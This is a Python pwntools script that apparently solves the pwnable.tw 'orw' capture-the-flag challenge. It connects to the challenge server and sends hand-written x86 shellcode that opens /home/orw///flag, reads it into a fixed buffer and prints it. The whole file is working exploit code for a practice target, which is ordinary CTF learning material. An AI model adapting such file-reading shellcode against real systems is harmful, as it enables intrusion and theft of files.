from pwn import *
import codecs
p = remote('chall.pwnable.tw', 10001)


sc = """
mov eax, 5
push 0
push 0x67616c66
push 0x2f2f2f77
push 0x726f2f65
push 0x6d6f682f
mov ebx,esp
xor ecx,ecx
xor edx,edx
int 0x80

push eax
mov eax, 3
pop ebx
mov ecx, 0x0804a060
add ecx, 160
mov edx, 40
int 0x80 

mov eax, 4
mov ebx, 1
mov ecx, 0x0804a060
add ecx, 160
mov edx, 40
int 0x80 
"""
p.recvuntil('Give my your shellcode:')
p.send(asm(sc))
print p.recv(60)
p.interactive()